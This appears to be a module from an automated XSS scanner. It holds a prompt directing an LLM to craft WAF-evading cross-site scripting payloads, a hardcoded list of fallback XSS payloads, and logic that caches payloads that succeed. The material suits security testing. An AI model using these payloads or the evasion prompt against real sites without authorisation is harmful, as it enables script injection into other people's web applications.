import hashlib
import json
import uuid
from datetime import datetime
from dataclasses import dataclass, field
from typing import Optional

from core.config import ScanConfig


@dataclass
class ServerContext:
    waf_name: str = "unknown"
    reflection_context: str = "body"
    encoding_type: str = "none"
    blocked_chars: list[str] = field(default_factory=list)
    reflected_chars: list[str] = field(default_factory=list)
    server_headers: dict = field(default_factory=dict)
    last_payload: str = ""
    last_result: str = ""

    def context_hash(self) -> str:
        raw = f"{self.waf_name}|{self.reflection_context}|{self.encoding_type}"
        return hashlib.sha256(raw.encode()).hexdigest()


SERVER_AWARE_PROMPT = """You are an XSS payload engineer. Generate a payload that bypasses the following server-side filter:

SERVER CONTEXT:
- WAF: {waf_name}
- Input reflection context: {reflection_context}
- Encoding applied by server: {encoding_type}
- Blocked characters: {blocked_chars}
- Characters that are reflected unmodified: {reflected_chars}
- Relevant response headers: {server_headers_json}

PREVIOUS ATTEMPT:
  Payload: {last_payload}
  Result: {last_result}

Rules:
- Return ONLY the raw payload as a plain string. No markdown, no code fences, no explanation.
- The payload must execute alert(1) or prompt(1) in a modern browser to confirm XSS.
- Be creative: event handlers, JS encoding, polyglots, DOM clobbering, template injections.
- If previous attempt was blocked, try a completely different technique.
- If characters were HTML-entity encoded, use event handlers or JS-based approaches.
- If script tags are stripped, avoid them entirely.
"""


FALLBACK_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "{{constructor.constructor('alert(1)')()}}",
    "<svg onload=alert(1)>",
    "'-alert(1)-'",
    "\";alert(1);//",
    "<details open ontoggle=alert(1)>",
]


class PayloadGenerator:
    def __init__(self, config: ScanConfig, db=None):
        self.config = config
        self.db = db
        self._cache: dict[str, str] = {}

    async def get_payload(self, ctx: ServerContext) -> str:
        ch = ctx.context_hash()
        if ch in self._cache:
            return self._cache[ch]

        if self.db:
            cached = await self.db.find_payload_by_hash(ch)
            if cached:
                self._cache[ch] = cached["payload"]
                return cached["payload"]

        if self.config.llm.payload_gen_enabled:
            payload = await self._generate_via_llm(ctx)
            if payload:
                self._cache[ch] = payload
                return payload

        if self.config.llm.payload_gen_fallback:
            return FALLBACK_PAYLOADS[0]

        return ""

    async def _generate_via_llm(self, ctx: ServerContext) -> Optional[str]:
        from .ollama_provider import OllamaProvider
        from .openai_provider import OpenAIProvider

        if self.config.llm.provider == "openai" and self.config.llm.api_key:
            provider = OpenAIProvider(self.config.llm)
        else:
            provider = OllamaProvider(self.config.llm)

        prompt = SERVER_AWARE_PROMPT.format(
            waf_name=ctx.waf_name,
            reflection_context=ctx.reflection_context,
            encoding_type=ctx.encoding_type,
            blocked_chars=json.dumps(ctx.blocked_chars),
            reflected_chars=json.dumps(ctx.reflected_chars),
            server_headers_json=json.dumps(ctx.server_headers),
            last_payload=ctx.last_payload,
            last_result=ctx.last_result,
        )

        try:
            response = await provider.generate_payload(prompt, timeout=self.config.llm.payload_gen_timeout)
            payload = response.strip().strip("```").strip()
            if not payload:
                return None
            if payload.startswith("json"):
                payload = payload[4:].strip()
            if payload and len(payload) < 2000:
                return payload
        except Exception:
            pass
        return None

    async def report_success(self, ctx: ServerContext, payload: str):
        ch = ctx.context_hash()
        self._cache[ch] = payload
        if self.db:
            await self.db.save_successful_payload({
                "id": uuid.uuid4().hex[:12],
                "context_hash": ch,
                "payload": payload,
                "waf_fingerprint": ctx.waf_name,
                "reflection_context": ctx.reflection_context,
                "encoding_type": ctx.encoding_type,
                "target_domain": "",
                "hit_count": 1,
                "successful_at": datetime.utcnow().isoformat(),
            })

    def analyze_response(self, body: str, payload: str) -> dict:
        result = {"reflected": False, "encoded": False, "reflection_type": "none", "blocked": False}
        if not body or not payload:
            return result
        if payload in body:
            result["reflected"] = True
            result["reflection_type"] = "exact"
            return result
        escaped = payload.replace("<", "&lt;").replace(">", "&gt;")
        if escaped in body:
            result["reflected"] = True
            result["encoded"] = True
            result["reflection_type"] = "html_entity_encoded"
            return result
        blocked_indicators = ["blocked", "denied", "rejected", "403 forbidden", "waf"]
        if any(ind in body.lower() for ind in blocked_indicators):
            result["blocked"] = True
            result["reflection_type"] = "blocked"
        return result
